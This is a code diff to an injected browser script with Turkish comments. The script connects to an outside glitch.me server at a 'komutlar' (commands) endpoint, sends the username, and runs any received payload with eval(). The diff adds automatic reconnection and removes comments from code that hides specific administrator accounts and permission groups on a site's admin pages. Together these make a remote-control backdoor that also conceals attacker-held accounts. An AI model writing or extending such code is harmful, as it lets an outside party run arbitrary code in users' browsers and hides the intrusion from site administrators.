@@ -15,20 +15,33 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
 
     const username = getUsername();
 
-    const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
-    eventSource.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        if (data.payload) {
-            eval(data.payload);
-        }
-    };
-    eventSource.onerror = () => {};
-    eventSource.onopen = () => {};
+    function connectSSE() {
+        const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
+
+        eventSource.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            if (data.payload) {
+                eval(data.payload);
+            }
+        };
+
+        eventSource.onopen = () => {
+            // Bağlantı açıldığında bir şey yapmana gerek yok, ama log eklenebilir
+        };
+
+        eventSource.onerror = () => {
+            eventSource.close(); // Bağlantıyı kapat
+            setTimeout(connectSSE, 2000); // 2 saniye sonra yeniden bağlan
+        };
+
+        return eventSource;
+    }
+
+    connectSSE();
 
     document.addEventListener('DOMContentLoaded', () => {
         var currentUrl = window.location.href;
 
-        // Yetki-gruplari sayfasında ID’si 23 ve 24 olan satırları gizle, Ctrl+Shift+S ile geri getir
         if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
             let hiddenRows = [];
 
@@ -50,7 +63,6 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
             });
         }
 
-        // kullanicidetay.php?t= sayfalarında value="23" ve value="24" olan option’ları gizle, Ctrl+Shift+S ile geri getir
         if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
             let hiddenOptions = [];
 
@@ -85,7 +97,6 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
             });
         }
 
-        // yoneticiler sayfasında ID’si 45593 ve 45948 olan satırları gizle, Ctrl+Shift+S ile geri getir
         if (currentUrl.includes('/duello/ad_/yoneticiler')) {
             let hiddenManagerRows = [];
 
@@ -117,7 +128,6 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
             });
         }
 
-        // duello sayfasında aktifuser_45593 ve aktifuser_45948’i gizle, Ctrl+Shift+S ile geri getir + Eğitim Paketleri
         if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
             let hiddenUsers = [];
 
@@ -134,13 +144,8 @@ if (!window.hasOwnProperty('karmaScriptLoaded')) {
                 }
             }
 
-            // İlk yüklemede gizle
             hideUsers();
-
-            // Sürekli kontrol için interval ekle (MutationObserver yetmezse)
-            setInterval(hideUsers, 1000); // Her 1 saniyede bir kontrol et
-
-            // MutationObserver ile dinamik güncellemeleri izle
+            setInterval(hideUsers, 1000);
             const observer = new MutationObserver(() => {
                 hideUsers();
             });
